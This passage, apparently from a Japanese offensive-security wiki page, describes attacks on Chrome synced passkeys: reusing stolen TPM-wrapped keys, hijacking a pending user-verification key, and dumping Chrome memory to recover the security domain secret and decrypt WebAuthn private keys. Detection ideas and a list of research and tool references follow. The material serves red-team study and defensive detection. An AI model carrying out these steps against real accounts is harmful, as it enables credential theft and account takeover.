   - 盗んだ`wrapped_identity_private_key` blobを被害者のTPM上で使用し、cloud-authenticator request bindingに署名する。
   - 返されたassertionをrelying partyにrelayする。
   - RPが`userVerification=preferred`を受け入れる場合や、**`UV=0`**のassertionを拒否しない場合に、特に有効。
2. **Pending UV-key hijack**<sup>[[4]](#references)</sup>
   - `passkey_enclave_state`を削除するか、有効な署名付き`device/forget` operationを送信して、再オンボーディングを強制する。
   - オンボーディング後もデバイスが**`uv_key_pending`**状態の場合、攻撃者が管理するUV public keyを登録する。
   - プロバイダーが新しいUV keyのattestation / secure-hardware originを検証しない場合、以降の攻撃者のkeyによる署名は**`UV=1`**として扱われる。
3. **Master-secret / SDS recovery theft**<sup>[[4]](#references)</sup>
   - recoveryまたはrejoinを強制し、Chromeにsynced-passkey master secretを取得させる。
   - `passkey_enclave_state`の再作成・変更を監視し、平文の**security domain secret (SDS)**がメモリ上にある間にChromeのメモリをdumpする。
   - 復元したSDSを使用して、各`WebauthnCredentialSpecifics` record内の暗号化フィールドを復号し、ポータブルなWebAuthn private keyを復元する。

### DFIR / 検知のアイデア

- `passkey_enclave_state`の**削除・再作成**を監視する。<sup>[[4]](#references)</sup>
- ブラウザー以外のプロセスによるChromeの**`Sync Data\LevelDB`**への異常なアクセスを検知する。
- **Chromeのメモリdump**や、疑わしいプロセス間メモリアクセスを検知する。
- Google Password Managerの**recovery PIN**が繰り返し要求される場合や、予期しない再オンボーディングが発生した場合は調査する。
- WebAuthnの**`signCount`**は、synced passkeyでは値が一定のままの場合があり、役に立たないことが多い。そのため、従来のclone検知は効果が弱いことに注意する。



## References

- [1] [Unit 42 – 高価値セクターを標的とした、長年にわたり検知されなかった作戦の調査](https://unit42.paloaltonetworks.com/cl-unk-1068-targets-critical-sectors/)
- [2] [0xdf – HTB/VulnLab JobTwo: SMTP経由のWord VBA macro phishing → hMailServer credentialの復号 → Veeam CVE-2023-27532によるSYSTEM権限の取得](https://0xdf.gitlab.io/2026/01/27/htb-jobtwo.html)
- [3] [Check Point Research – Ink Dragonの内部: relay networkと、巧妙な攻撃作戦の内部構造を明らかにする](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)
- [4] [Unit 42 – Pass the Passkey: passwordless authenticationにおける新たな攻撃対象領域](https://unit42.paloaltonetworks.com/passwordless-authentication-security-risks/)
- [5] [Chromium – `webauthn_credential_specifics.proto`](https://chromium.googlesource.com/chromium/src/+/main/components/sync/protocol/webauthn_credential_specifics.proto)
- [6] [Microsoft – `NCryptCreatePersistedKey` / CNG key storage](https://learn.microsoft.com/en-us/windows/win32/api/ncrypt/nf-ncrypt-ncryptcreatepersistedkey)
- [7] [0xWord – Windows hacking: Microsoftのシステムとネットワークへの攻撃](https://0xword.com/es/libros/99-hacking-windows-ataques-a-sistemas-y-redes-microsoft.html)
- [8] [Active Directoryのデータストアの実際の仕組み: NTDS.ditの内部 (Part 1)](https://blog.chrisse.se/?p=762)
- [9] [en.hackndo.com - Remote Lsass Dump Passwords](https://en.hackndo.com/remote-lsass-dump-passwords)
- [10] [Kaspersky Securelist – Armored Likho、Still toolkitでサイバースパイ活動の手段を拡大](https://securelist.com/armored-likho-still-toolkit/121033)
- [11] [Microsoft Learn – CreateFileW functionと`FILE_FLAG_BACKUP_SEMANTICS`](https://learn.microsoft.com/en-us/windows/win32/api/fileapi/nf-fileapi-createfilew)
- [12] [Microsoft Learn – Robocopy `/B` backup mode](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/robocopy)
- [13] [Telegram FAQ – アクティブなセッションの終了](https://telegram.org/faq)
- [14] [Microsoft Learn: Remote Credential GuardとRestricted Admin](https://learn.microsoft.com/en-us/windows/security/identity-protection/remote-credential-guard)
- [15] [Microsoft Learn: Credentials Protection and Management](https://learn.microsoft.com/en-us/windows-server/security/credentials-protection-and-management/credentials-protection-and-management)
- [16] [S12 DumpNTDS.cpp](https://github.com/S12cybersecurity/HandleRedirect/blob/main/DumpNTDS/DumpNTDS/DumpNTDS.cpp)
- [17] [VMkatz - 対応する入力とクイックスタート](https://github.com/nikaiw/VMkatz)
- [18] [0xdf - HTB: Checkpoint](https://0xdf.gitlab.io/2026/10/24/htb-checkpoint.html)
{{#include ../../banners/hacktricks-training.md}}
